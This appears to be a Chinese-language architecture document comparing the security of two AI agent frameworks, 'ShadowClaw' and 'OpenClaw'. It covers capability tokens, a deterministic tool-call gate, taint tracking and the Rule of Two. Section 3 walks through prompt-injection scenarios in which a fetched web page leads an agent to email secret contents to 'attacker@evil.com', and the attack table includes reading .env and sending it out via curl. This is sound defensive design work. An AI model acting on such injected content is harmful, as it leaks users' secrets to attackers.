# Part 4 (上): ShadowClaw 安全架构优越性 — 范式转换与深度理解

---

## 1. 根本性范式转换: 从 "信任-验证" 到 "零信任-授权"

### 1.1 两种安全哲学的本质区别

**OpenClaw 模型 — "信任然后验证" (Trust-then-Verify):**
```
前提: Agent = 操作者的代理 → 继承全部权限
安全策略: 配置黑名单/白名单 → 运行时检查 → 事后审计
失败模式: 任何检查遗漏 = 完整权限暴露
```

**ShadowClaw 模型 — "零信任然后授权" (Zero-Trust-then-Authorize):**
```
前提: Agent = 零权限实体 → 需要逐次授权
安全策略: 事件分析 → JIT 最小令牌签发 → 确定性门控验证
失败模式: 授权遗漏 = 功能受限 (安全失败)
```

这不是程度差异，而是 **范式差异**。就像从 "默认允许" 防火墙到 "默认拒绝" 防火墙的转变。

### 1.2 为什么这在 Agent 安全中至关重要

传统软件的权限边界是 **静态的** — 用户登录后，权限在会话期间不变。这在传统软件中是合理的，因为用户的意图不会被外部数据改变。

但 AI Agent 面临一个根本性的新威胁: **Agent 的行为可以被它处理的数据改变**。

Prompt Injection 使得:
- 处理一封邮件可能改变 Agent 的 "意图"
- 访问一个网页可能触发 Agent 执行未经授权的操作
- 读取一个文件可能引导 Agent 泄露其他文件

在这种威胁模型下，**会话级权限是不安全的**。Agent 在处理不同事件时应该拥有不同的权限 — 处理邮件时不需要 `bash`，执行代码时不需要 `send_email`。ShadowClaw 的 **请求级 CapabilityToken** 正是这一洞察的工程实现。

### 1.3 攻击面量化对比

```
OpenClaw 攻击面:
  可用工具数 × 会话持续时间 × 注入成功概率
  = 45+ × ∞ (无 TTL) × p
  = 无界

ShadowClaw 攻击面:
  令牌工具数 × TTL × 注入概率 × 令牌验证 × 污染检查 × 结构约束
  = 2-5 × 300s × p × q₁ × q₂ × q₃
  ≈ p × 10⁻⁷ (相对改善)
```

### 1.4 核心问题: OpenClaw 能否简单引入能力安全?

**回答: 不能。能力安全需要 EventBus 作为结构性前提。**

这不是观点，而是代码级的事实。以下是 CapabilityIssuer 签发令牌时对 Event 对象的具体依赖 (s26_capability_gate.py):

**依赖 1 — 不可伪造的事件溯源:**
```
_classify_event_trust(events) 检查:
  event.source (frozen field) + event.origin_chain (frozen tuple)
  → 如果 source="custom" 且 origin_chain 无内部模块标记 → REMOTE_OPEN
  → 自动剥离 bash, run_command, daemon_restart 等高风险工具
```
在 HTTP 请求-响应模型中，source 信息来自 HTTP headers — **攻击者可以伪造 headers**。在 EventBus 中，Event 是 frozen dataclass，source 在创建时不可变。

**依赖 2 — 框架强制的级联深度:**
```
EventBus.inject() 自动递增 cascade_depth:
  parent_depth = getattr(self._tls, "cascade_depth", -1)
  if parent_depth >= 0 and cascade_depth == 0:
      cascade_depth = parent_depth + 1
```
这是 **框架行为，不是消费者代码的责任**。在请求-响应模型中，每个 handler 必须手动传递并递增 depth — 一个恶意 handler 可以不递增。

**依赖 3 — 批量原子性:**
```
issue_for_events([event1, event2, event3]):
  → 从所有事件的 payload 提取路径 → 签发一个令牌覆盖路径并集
  → Rule of Two 在整个批次的上下文中检查
```
在请求-响应模型中，每个请求独立签发令牌。你无法对 "3 个文件变化 + 1 个 cron 任务" 这样的批次做原子安全决策。

**依赖 4 — 自动化侧消费者安全链:**
```
SecurityEventConsumer, CapabilityGateAuditConsumer 等
  → 通过 EventBus 订阅事件流
  → 无需与主 Agent 循环显式耦合
```
在请求-响应模型中，你需要为每个安全检查编写独立的中间件，并确保它们的执行顺序。

**结论**: OpenClaw 如果想引入能力安全，必须:
1. 将所有触发源统一为事件 (= 引入 EventBus)
2. 确保事件元数据不可伪造 (= frozen dataclass)
3. 实现框架级的级联深度追踪 (= EventBus 核心功能)
4. 支持批量原子安全决策 (= EventConsumer 批处理)

这不是 "加一个中间件" 的工作量。这是 **架构重构**。EventBus 不是能力安全的可选组件——它是结构性前提。

---

## 2. 确定性安全层 — 免疫 Prompt Injection 的门控

### 2.1 为什么 LLM 不能做安全决策

OpenClaw 的安全模型 **部分依赖 LLM 遵从安全指令**:

- SECURITY NOTICE 要求 LLM 忽略外部内容中的指令
- 工具策略由 LLM 在系统提示中被告知
- LLM 被期望在处理不可信数据时保持谨慎

但 LLM 有三个根本性缺陷使其不适合做安全决策:

1. **可被社会工程**: 精心构造的 prompt 可以绕过指令
2. **不确定性**: 同一输入可能产生不同的安全决策
3. **上下文稀释**: 长对话中安全指令被 "遗忘"

### 2.2 ShadowClaw 的确定性 Gate

CapabilityGate 是 **纯 Python 代码**，零 LLM 依赖:

```
安全决策路径:
  tool_call(name, args) → CapabilityGate.verify()
    → Check 1: token.is_tool_allowed(name)?      [字典查找]
    → Check 2: taint_store.query(args) ≤ policy?  [哈希查询]
    → Check 3: rule_of_two.check()?               [布尔运算]
    → 结果: ALLOW 或 DENY + 原因
```

每一步都是 **确定性的**:
- 相同输入 → 相同输出 (无随机性)
- 不受上下文长度影响 (不经过 LLM)
- 不受 Prompt Injection 影响 (不解释自然语言)
- 可形式化验证 (有限状态空间)
- 可完整测试 (确定性输入输出)

**这是 ShadowClaw 最深刻的安全创新**: 将安全决策从概率性的 LLM 判断转变为确定性的代码验证。

### 2.3 确定性 vs 概率性的安全含义

| 属性 | OpenClaw (概率性) | ShadowClaw (确定性) |
|------|-------------------|---------------------|
| 可预测性 | 同一输入可能产生不同结果 | 同一输入必然产生相同结果 |
| 可测试性 | 需要统计采样验证 | 单次测试即可验证 |
| 可形式化 | 无法证明安全属性 | 可通过代码审查证明 |
| 抗注入性 | 依赖 LLM 抗注入能力 | 不处理自然语言，免疫 |
| 审计性 | "LLM 判断允许" | "Check 2 DENY: taint=EXTERNAL > policy.USER" |

---

## 3. 值级污染追踪 — 数据流安全的工程实现

### 3.1 传统 Agent 的数据流盲区

在 OpenClaw (以及几乎所有 Agent 框架) 中：

```
Step 1: LLM 调用 web_fetch("http://example.com")
Step 2: 返回结果 "Contact: attacker@evil.com"
Step 3: LLM 在后续调用中使用 "attacker@evil.com"
Step 4: LLM 调用 send_email(to="attacker@evil.com", body="密钥内容")

在 Step 4 时，系统无法区分:
  - "attacker@evil.com" 来自用户输入 (可信)
  - "attacker@evil.com" 来自外部网页 (不可信)
```

这是 **数据流盲区**: 系统失去了对数据来源和传播路径的追踪。

### 3.2 ShadowClaw 的 TaintStore 解决方案

**三层查询策略 (短路优先):**

1. **边界标记检测**: 内容是否被 `wrap_external_content()` 包裹
   - 随机 16 字符 hex ID 防欺骗
   - 攻击者伪造标记的概率: 1/2^64

2. **精确指纹匹配**: SHA-256(内容前缀) 在 TaintStore 中查找
   - O(1) 查询复杂度
   - 适用于完整内容块

3. **子串索引匹配**: 从大内容中提取邮箱/URL/路径，单独索引
   - 适用于 LLM 提取并使用的片段
   - 即使 LLM 只使用了外部数据的一部分，仍可追踪

**CausalTaintTracker — 因果级追踪:**
- 一旦 LLM 上下文接触过 EXTERNAL 数据 → 永久标记为 "已污染"
- 单调递增，不可逆 (even if EXTERNAL content removed from context)
- 防御: LLM 通过 "改写" 规避内容级指纹

### 3.3 双层防御模型: 为什么需要 TaintStore 和 CausalTaintTracker 两层

这不是 "有缺陷然后被弥补" 的关系，而是 **两层独立防御，各自覆盖不同的攻击向量**。通过代码追踪 (s26_capability_gate.py)，两者的精确分工如下:

**TaintStore (内容级) — 覆盖: 直接数据复制攻击**

```
攻击: LLM 从 web_fetch 获取 "attacker@evil.com"
     → 直接作为 send_email(to="attacker@evil.com") 的参数

TaintStore.query("attacker@evil.com"):
  → SHA-256 指纹匹配 → 返回 EXTERNAL
  → send_email.to 要求 taint ≤ USER → DENY

CausalTaintTracker 也能阻止这个? 可以，但太粗粒度:
  → 它会阻止 send_email 的所有调用，包括合法的
  → TaintStore 只阻止使用了外部数据作为参数的调用 (精确)
```

**CausalTaintTracker (因果级) — 覆盖: 改写/重组攻击**

```
攻击: LLM 从 web_fetch 获取 JSON {"user": "evil_admin"}
     → LLM 改写为 "我应该联系 evil_admin 这个用户"
     → 使用改写后的文本作为 send_email 的参数

TaintStore.query("我应该联系 evil_admin 这个用户"):
  → 指纹不匹配原始 JSON → 返回 None → 不阻止 ❌

CausalTaintTracker.check_tool_call("send_email"):
  → round_taint = EXTERNAL (因为本轮调用过 web_fetch)
  → send_email 是 external_action → DENY ✅
```

**为什么不能只用 CausalTaintTracker:**
- 它是粗粒度的: 一旦 round_taint=EXTERNAL，**所有**后续外部动作被阻止
- 高误报率: 如果 Agent 先 web_fetch 查天气，再要发工作邮件 → 邮件被不必要地阻止
- TaintStore 提供精确的参数级检查: "只有使用了外部数据的参数才被阻止"

**为什么不能只用 TaintStore:**
- LLM 可以改写内容绕过指纹: "attacker@evil.com" → "the attacker's email" → 指纹不匹配
- TaintStore.query() 返回 None 时是 **fail-open** (允许通过)
- CausalTaintTracker 是 fail-safe: 曾接触外部数据 = 永久标记

**两层共同构成纵深防御:**

| 攻击类型 | TaintStore | CausalTaintTracker | 结果 |
|----------|-----------|---------------------|------|
| 直接复制外部数据 | DENY (精确) | DENY (粗粒度) | 双重阻断 |
| LLM 改写外部数据 | 未检测 (None) | DENY (因果级) | 单层阻断 |
| 合法操作 (无外部数据) | 允许 (精确) | 允许 (无污染) | 正常执行 |
| 合法操作 (同轮有外部数据) | 允许 (参数无外部) | 可能阻止 (粗粒度) | TaintStore 避免误报 |

---

## 4. Rule of Two — 攻击链的结构性阻断

### 4.1 完整攻击需要三个条件

分析所有已知的 Agent 安全事件，一个完整的数据外泄攻击需要:

1. **获取不可信输入** — Agent 处理攻击者控制的数据
2. **访问敏感数据** — Agent 读取密钥、凭证、个人信息
3. **执行外部动作** — Agent 将数据发送到外部

三个条件同时满足 = 攻击成功。缺少任何一个 = 攻击失败。

### 4.2 Rule of Two 的阻断逻辑

```
allows_untrusted_input + allows_sensitive_data + allows_external_action
                         最多两个为 True

可能的组合:
✅ 不可信输入 + 敏感数据    → 不能执行外部动作 (无法外泄)
✅ 不可信输入 + 外部动作    → 不能访问敏感数据 (无有价值数据)
✅ 敏感数据 + 外部动作      → 不能有不可信输入 (无注入向量)
❌ 三者同时 → DENY
```

### 4.3 为什么这是充分的

在 Agent 安全的上下文中，每类攻击都需要至少三个条件:

| 攻击类型 | 不可信输入 | 敏感数据 | 外部动作 |
|----------|------------|----------|----------|
| 数据外泄 | 注入指令 | 读取密钥 | 发送到攻击者 |
| 凭证窃取 | 恶意网页 | 读取 .env | curl 外发 |
| 身份冒充 | 伪造消息 | 读取联系人 | 发送消息 |
| 供应链攻击 | 恶意依赖 | 读取源码 | 上传外部 |

**Rule of Two 在结构上切断了每一条攻击链的第三环。**

### 4.4 双层执行

- **静态层 (令牌签发时)**: CapabilityToken.check_rule_of_two() — 预防性
- **动态层 (批处理运行时)**: CausalRuleOfTwo — 响应性
  - 追踪批处理期间实际发生的操作
  - 即使静态检查通过，运行时条件变化也会触发阻断
